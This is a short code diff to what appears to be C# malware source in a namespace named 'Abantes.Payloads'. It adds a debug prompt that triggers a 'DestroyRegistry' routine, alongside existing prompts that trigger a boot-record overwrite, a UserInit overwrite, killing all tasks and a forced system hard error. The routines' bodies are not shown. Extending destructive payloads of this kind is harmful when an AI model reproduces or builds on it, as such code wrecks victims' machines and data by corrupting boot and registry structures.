@@ -255,6 +255,8 @@ namespace Abantes.Payloads
                 { UserInitOverwrite(); }
                 if (MessageBox.Show("MBR OVERWRITE?", "DEBUG", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
                 { MBR_Overwrite(); }
+                if (MessageBox.Show("DESTROY REGISTRY?", "DEBUG", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
+                { DestroyRegistry(); }
                 if (MessageBox.Show("KILL ALL TASKS?", "DEBUG", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
                 { KillAll(); }
                 if (MessageBox.Show("NTRAISEHARDERROR?", "DEBUG", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
